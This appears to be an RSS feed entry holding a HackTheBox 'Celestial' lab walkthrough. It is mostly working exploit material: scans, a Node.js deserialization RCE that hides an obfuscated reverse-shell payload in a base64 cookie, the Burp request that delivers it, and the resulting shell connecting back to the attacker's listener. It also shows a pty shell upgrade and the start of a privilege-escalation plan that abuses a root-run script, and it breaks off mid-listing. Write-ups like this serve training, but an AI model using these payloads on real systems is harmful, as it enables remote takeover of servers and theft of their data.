<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Root Network Security</title>
    <description>Beginners's journey through the world of security, programming and system administration. In love with GNU/Linux and cryptography.</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    
      <item>
        <title>Hackthebox - Celestial</title>
        <description>&lt;p&gt;This time we’re going to have fun with a machine called Celestial, which is fun little box.&lt;/p&gt;

&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;

&lt;p&gt;Let’s start from a simple &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/hackthebox/celestial# nmap 10.10.10.85
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-10 13:11 EDT
Nmap scan report for 10.10.10.85
Host is up (0.044s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 3.94 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;From here we can see one port open - &lt;code class=&quot;highlighter-rouge&quot;&gt;3000&lt;/code&gt; with service called &lt;code class=&quot;highlighter-rouge&quot;&gt;ppp&lt;/code&gt;. But actaully, using &lt;code class=&quot;highlighter-rouge&quot;&gt;curl&lt;/code&gt; on it yields us a &lt;code class=&quot;highlighter-rouge&quot;&gt;404&lt;/code&gt; error code.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/hackthebox/celestial# curl 10.10.10.85:3000
&amp;lt;h1&amp;gt;404&amp;lt;/h1&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But, actually visiting this website second time (both times in a browser) gives us a completely different website.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;http://10.10.10.85:3000/
Hey Dummy 2 + 2 is 22&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I decided to fire up &lt;code class=&quot;highlighter-rouge&quot;&gt;burp&lt;/code&gt;, in which we can see a &lt;code class=&quot;highlighter-rouge&quot;&gt;profile&lt;/code&gt; cookie set, which looks like a &lt;code class=&quot;highlighter-rouge&quot;&gt;base64&lt;/code&gt; encoded string.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;HTTP/1.1 200 OK
X-Powered-By: Express
Set-Cookie: profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D; Max-Age=900; Path=/; Expires=Tue, 10 Jul 2018 18:01:28 GMT; HttpOnly
Content-Type: text/html; charset=utf-8
Content-Length: 12
ETag: W/&quot;c-8lfvj2TmiRRvB7K+JPws1w9h6aY&quot;
Date: Tue, 10 Jul 2018 17:46:28 GMT
Connection: close

&amp;lt;h1&amp;gt;404&amp;lt;/h1&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Decoding it gives us data, which is shown on the website.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/hackthebox/celestial# echo &quot;eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ==&quot; | base64 -d
{&quot;username&quot;:&quot;Dummy&quot;,&quot;country&quot;:&quot;Idk Probably Somewhere Dumb&quot;,&quot;city&quot;:&quot;Lametown&quot;,&quot;num&quot;:&quot;2&quot;}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;In addition, from &lt;code class=&quot;highlighter-rouge&quot;&gt;nikto&lt;/code&gt; scan, we can see that the server is running &lt;code class=&quot;highlighter-rouge&quot;&gt;Express&lt;/code&gt; which is probably &lt;code class=&quot;highlighter-rouge&quot;&gt;Express + NodeJS&lt;/code&gt; combination.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/hackthebox/celestial# nikto -h 10.10.10.85:3000
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.85
+ Target Hostname:    10.10.10.85
+ Target Port:        3000
+ Start Time:         2018-07-10 13:28:46 (GMT-4)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ Retrieved x-powered-by header: Express
+ Server leaks inodes via ETags, header found with file /, fields: 0xW/c 0x8lfvj2TmiRRvB7K+JPws1w9h6aY 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, HEAD 
+ ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response
+ Scan terminated:  19 error(s) and 6 item(s) reported on remote host
+ End Time:           2018-07-10 13:35:44 (GMT-4) (418 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;From here we can just use google and find about &lt;a href=&quot;https://hd7exploit.wordpress.com/2017/05/29/exploiting-node-js-deserialization-bug-for-remote-code-execution-cve-2017-5941/&quot;&gt;this awesome&lt;/a&gt; RCE exploit in NodeJS unserialization.&lt;/p&gt;

&lt;p&gt;As we’ve done the same exploit in &lt;a href=&quot;http://localhost:4000/vulnhub-temple-of-doom/&quot;&gt;previos machine&lt;/a&gt; from Vulnhub, I decided to already move on to the reverse shell, cloned from &lt;a href=&quot;https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py&quot;&gt;this repository&lt;/a&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/hackthebox/celestial# python js-reverseshell.py 10.10.15.249 6666
[+] LHOST = 10.10.15.249
[+] LPORT = 6666
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,53,46,50,52,57,34,59,10,80,79,82,84,61,34,54,54,54,54,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we just have to correctly append the &lt;code class=&quot;highlighter-rouge&quot;&gt;rce&lt;/code&gt; data into the cookie.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;{&quot;username&quot;:&quot;Dummy&quot;,&quot;country&quot;:&quot;Idk Probably Somewhere Dumb&quot;,&quot;city&quot;:&quot;Lametown&quot;,&quot;num&quot;:&quot;124124142124&quot;, &quot;rce&quot;:&quot;_$$ND_FUNC$$_function(){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,53,46,50,52,57,34,59,10,80,79,82,84,61,34,54,54,54,54,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()&quot;}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Using &lt;code class=&quot;highlighter-rouge&quot;&gt;burp repeater&lt;/code&gt;, we can firstly &lt;code class=&quot;highlighter-rouge&quot;&gt;base64&lt;/code&gt; encode the cookie, and then send the contents to the website.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;GET / HTTP/1.1
Host: 10.10.10.85:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjEyNDEyNDE0MjEyNCIsICJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7ZXZhbChTdHJpbmcuZnJvbUNoYXJDb2RlKDEwLDExOCw5NywxMTQsMzIsMTEwLDEwMSwxMTYsMzIsNjEsMzIsMTE0LDEwMSwxMTMsMTE3LDEwNSwxMTQsMTAxLDQwLDM5LDExMCwxMDEsMTE2LDM5LDQxLDU5LDEwLDExOCw5NywxMTQsMzIsMTE1LDExMiw5NywxMTksMTEwLDMyLDYxLDMyLDExNCwxMDEsMTEzLDExNywxMDUsMTE0LDEwMSw0MCwzOSw5OSwxMDQsMTA1LDEwOCwxMDAsOTUsMTEyLDExNCwxMTEsOTksMTAxLDExNSwxMTUsMzksNDEsNDYsMTE1LDExMiw5NywxMTksMTEwLDU5LDEwLDcyLDc5LDgzLDg0LDYxLDM0LDQ5LDQ4LDQ2LDQ5LDQ4LDQ2LDQ5LDUzLDQ2LDUwLDUyLDU3LDM0LDU5LDEwLDgwLDc5LDgyLDg0LDYxLDM0LDU0LDU0LDU0LDU0LDM0LDU5LDEwLDg0LDczLDc3LDY5LDc5LDg1LDg0LDYxLDM0LDUzLDQ4LDQ4LDQ4LDM0LDU5LDEwLDEwNSwxMDIsMzIsNDAsMTE2LDEyMSwxMTIsMTAxLDExMSwxMDIsMzIsODMsMTE2LDExNCwxMDUsMTEwLDEwMyw0NiwxMTIsMTE0LDExMSwxMTYsMTExLDExNiwxMjEsMTEyLDEwMSw0Niw5OSwxMTEsMTEwLDExNiw5NywxMDUsMTEwLDExNSwzMiw2MSw2MSw2MSwzMiwzOSwxMTcsMTEwLDEwMCwxMDEsMTAyLDEwNSwxMTAsMTAxLDEwMCwzOSw0MSwzMiwxMjMsMzIsODMsMTE2LDExNCwxMDUsMTEwLDEwMyw0NiwxMTIsMTE0LDExMSwxMTYsMTExLDExNiwxMjEsMTEyLDEwMSw0Niw5OSwxMTEsMTEwLDExNiw5NywxMDUsMTEwLDExNSwzMiw2MSwzMiwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsMTA1LDExNiw0MSwzMiwxMjMsMzIsMTE0LDEwMSwxMTYsMTE3LDExNCwxMTAsMzIsMTE2LDEwNCwxMDUsMTE1LDQ2LDEwNSwxMTAsMTAwLDEwMSwxMjAsNzksMTAyLDQwLDEwNSwxMTYsNDEsMzIsMzMsNjEsMzIsNDUsNDksNTksMzIsMTI1LDU5LDMyLDEyNSwxMCwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsMzIsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDExOCw5NywxMTQsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiwzMiw2MSwzMiwxMTAsMTAxLDExOSwzMiwxMTAsMTAxLDExNiw0Niw4MywxMTEsOTksMTA3LDEwMSwxMTYsNDAsNDEsNTksMTAsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0Niw5OSwxMTEsMTEwLDExMCwxMDEsOTksMTE2LDQwLDgwLDc5LDgyLDg0LDQ0LDMyLDcyLDc5LDgzLDg0LDQ0LDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE4LDk3LDExNCwzMiwxMTUsMTA0LDMyLDYxLDMyLDExNSwxMTIsOTcsMTE5LDExMCw0MCwzOSw0Nyw5OCwxMDUsMTEwLDQ3LDExNSwxMDQsMzksNDQsOTEsOTMsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTksMTE0LDEwNSwxMTYsMTAxLDQwLDM0LDY3LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsMTAxLDEwMCwzMyw5MiwxMTAsMzQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTIsMTA1LDExMiwxMDEsNDAsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMDUsMTEwLDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTE1LDExNiwxMDAsMTExLDExNywxMTYsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMDEsMTE0LDExNCw0NiwxMTIsMTA1LDExMiwxMDEsNDAsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExMSwxMTAsNDAsMzksMTAxLDEyMCwxMDUsMTE2LDM5LDQ0LDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCw5OSwxMTEsMTAwLDEwMSw0NCwxMTUsMTA1LDEwMywxMTAsOTcsMTA4LDQxLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDEwMSwxMTAsMTAwLDQwLDM0LDY4LDEwNSwxMTUsOTksMTExLDExMCwxMTAsMTAxLDk5LDExNiwxMDEsMTAwLDMzLDkyLDExMCwzNCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTExLDExMCw0MCwzOSwxMDEsMTE0LDExNCwxMTEsMTE0LDM5LDQ0LDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCwxMDEsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDEsMTE2LDg0LDEwNSwxMDksMTAxLDExMSwxMTcsMTE2LDQwLDk5LDQwLDcyLDc5LDgzLDg0LDQ0LDgwLDc5LDgyLDg0LDQxLDQ0LDMyLDg0LDczLDc3LDY5LDc5LDg1LDg0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwxMjUsMTAsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsNTksMTApKX0oKSJ9
Connection: close
Upgrade-Insecure-Requests: 1
If-None-Match: W/&quot;c-8lfvj2TmiRRvB7K+JPws1w9h6aY&quot;
Cache-Control: max-age=0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Here’s the response.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 63
ETag: W/&quot;3f-Jq3PV5CxMnkROFE+egILx77Habg&quot;
Date: Tue, 10 Jul 2018 18:59:06 GMT
Connection: close

Hey Dummy 124124142124 + 124124142124 is 1.2412414212412412e+23&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;In the meantime our previously set up listener catched the connection from the server.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/hackthebox/celestial# nc -lvp 6666
listening on [any] 6666 ...
10.10.10.85: inverse host lookup failed: Unknown host
connect to [10.10.15.249] from (UNKNOWN) [10.10.10.85] 52254
Connected!
ls -la
total 164
drwxr-xr-x 21 sun  sun  4096 Jul 10 14:50 .
drwxr-xr-x  3 root root 4096 Sep 19  2017 ..
-rw-rw-r--  1 sun  sun   213 Jul 10 13:54 backdoor.pe
-rw-rw-r--  1 sun  sun   213 Jul 10 13:54 backdoor.pe.1
-rw-------  1 sun  sun     1 Mar  4 15:24 .bash_history
-rw-r--r--  1 sun  sun   220 Sep 19  2017 .bash_logout
-rw-r--r--  1 sun  sun  3771 Sep 19  2017 .bashrc
-rwxrwxr-x  1 sun  sun   215 Jul 10 14:50 bd.pl
drwx------ 13 sun  sun  4096 Nov  8  2017 .cache
drwx------ 16 sun  sun  4096 Sep 20  2017 .config
drwx------  3 root root 4096 Sep 21  2017 .dbus
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Desktop
-rw-r--r--  1 sun  sun    25 Sep 19  2017 .dmrc
drwxr-xr-x  2 sun  sun  4096 Mar  4 15:08 Documents
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Downloads
-rw-r--r--  1 sun  sun  8980 Sep 19  2017 examples.desktop
drwx------  2 sun  sun  4096 Sep 21  2017 .gconf
drwx------  3 sun  sun  4096 Jul 10 14:42 .gnupg
drwx------  2 root root 4096 Sep 21  2017 .gvfs
-rw-------  1 sun  sun  6732 Jul 10 14:42 .ICEauthority
drwx------  3 sun  sun  4096 Sep 19  2017 .local
drwx------  4 sun  sun  4096 Sep 19  2017 .mozilla
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Music
drwxrwxr-x  2 sun  sun  4096 Sep 19  2017 .nano
drwxr-xr-x 47 root root 4096 Sep 19  2017 node_modules
-rw-rw-r--  1 sun  sun    20 Sep 19  2017 .node_repl_history
drwxrwxr-x 57 sun  sun  4096 Sep 19  2017 .npm
-rw-r--r--  1 root root   21 Jul 10 14:55 output.txt
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Pictures
-rw-r--r--  1 sun  sun   655 Sep 19  2017 .profile
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Public
-rw-rw-r--  1 sun  sun    66 Sep 20  2017 .selected_editor
-rw-rw-r--  1 sun  sun   870 Sep 20  2017 server.js
-rw-r--r--  1 sun  sun     0 Sep 19  2017 .sudo_as_admin_successful
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Templates
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Videos
-rw-------  1 sun  sun    48 Jul 10 14:42 .Xauthority
-rw-------  1 sun  sun    82 Jul 10 14:42 .xsession-errors
-rw-------  1 sun  sun  1302 Mar  7 08:33 .xsession-errors.old&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We can spawn a better shell with &lt;code class=&quot;highlighter-rouge&quot;&gt;python&lt;/code&gt; and look for &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; flag.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;which python
/usr/bin/python
python -c 'import pty; pty.spawn(&quot;/bin/sh&quot;)'
$ find . -name &quot;user.txt&quot;
find . -name &quot;user.txt&quot;
find: ‘./.gvfs’: Permission denied
find: ‘./.cache/dconf’: Permission denied
find: ‘./.dbus’: Permission denied
./Documents/user.txt
$ cat Documents/user.txt
cat Documents/user.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we can try and find a way to escalate. First this that we can see is the changing modified date for &lt;code class=&quot;highlighter-rouge&quot;&gt;output.txt&lt;/code&gt; file in the home directory of our user.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;$ ls -la
ls -la
total 164
drwxr-xr-x 21 sun  sun  4096 Jul 10 14:50 .
drwxr-xr-x  3 root root 4096 Sep 19  2017 ..
-rw-rw-r--  1 sun  sun   213 Jul 10 13:54 backdoor.pe
-rw-rw-r--  1 sun  sun   213 Jul 10 13:54 backdoor.pe.1
-rw-------  1 sun  sun     1 Mar  4 15:24 .bash_history
-rw-r--r--  1 sun  sun   220 Sep 19  2017 .bash_logout
-rw-r--r--  1 sun  sun  3771 Sep 19  2017 .bashrc
-rwxrwxr-x  1 sun  sun   215 Jul 10 14:50 bd.pl
drwx------ 13 sun  sun  4096 Nov  8  2017 .cache
drwx------ 16 sun  sun  4096 Sep 20  2017 .config
drwx------  3 root root 4096 Sep 21  2017 .dbus
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Desktop
-rw-r--r--  1 sun  sun    25 Sep 19  2017 .dmrc
drwxr-xr-x  2 sun  sun  4096 Mar  4 15:08 Documents
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Downloads
-rw-r--r--  1 sun  sun  8980 Sep 19  2017 examples.desktop
drwx------  2 sun  sun  4096 Sep 21  2017 .gconf
drwx------  3 sun  sun  4096 Jul 10 14:42 .gnupg
drwx------  2 root root 4096 Sep 21  2017 .gvfs
-rw-------  1 sun  sun  6732 Jul 10 14:42 .ICEauthority
drwx------  3 sun  sun  4096 Sep 19  2017 .local
drwx------  4 sun  sun  4096 Sep 19  2017 .mozilla
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Music
drwxrwxr-x  2 sun  sun  4096 Sep 19  2017 .nano
drwxr-xr-x 47 root root 4096 Sep 19  2017 node_modules
-rw-rw-r--  1 sun  sun    20 Sep 19  2017 .node_repl_history
drwxrwxr-x 57 sun  sun  4096 Sep 19  2017 .npm
-rw-r--r--  1 root root   21 Jul 10 15:00 output.txt
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Pictures
-rw-r--r--  1 sun  sun   655 Sep 19  2017 .profile
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Public
-rw-rw-r--  1 sun  sun    66 Sep 20  2017 .selected_editor
-rw-rw-r--  1 sun  sun   870 Sep 20  2017 server.js
-rw-r--r--  1 sun  sun     0 Sep 19  2017 .sudo_as_admin_successful
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Templates
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Videos
-rw-------  1 sun  sun    48 Jul 10 14:42 .Xauthority
-rw-------  1 sun  sun    82 Jul 10 14:42 .xsession-errors
-rw-------  1 sun  sun  1302 Mar  7 08:33 .xsession-errors.old

-rw-r--r--  1 root root   21 Jul 10 15:10 output.txt
-rw-r--r--  1 root root   21 Jul 10 15:30 output.txt &amp;lt;-- content is the same but it's being modified&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;In the same directory as the flag was &lt;code class=&quot;highlighter-rouge&quot;&gt;script.py&lt;/code&gt; which output seemed to be put into the &lt;code class=&quot;highlighter-rouge&quot;&gt;output.txt&lt;/code&gt; file. We can leverage our privilages to write this file by placing malicious python script that will &lt;code class=&quot;highlighter-rouge&quot;&gt;ls&lt;/code&gt; the content of &lt;code class=&quot;highlighter-rouge&quot;&gt;/root&lt;/code&gt; directory. After waiting for the next execution, we will have the desired output.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;$ cd Documents
cd Documents
$ ls -la
ls -la
total 16
drwxr-xr-x  2 sun sun 4096 Mar  4 15:08 .
drwxr-xr-x 21 sun sun 4096 Jul 10 16:04 ..
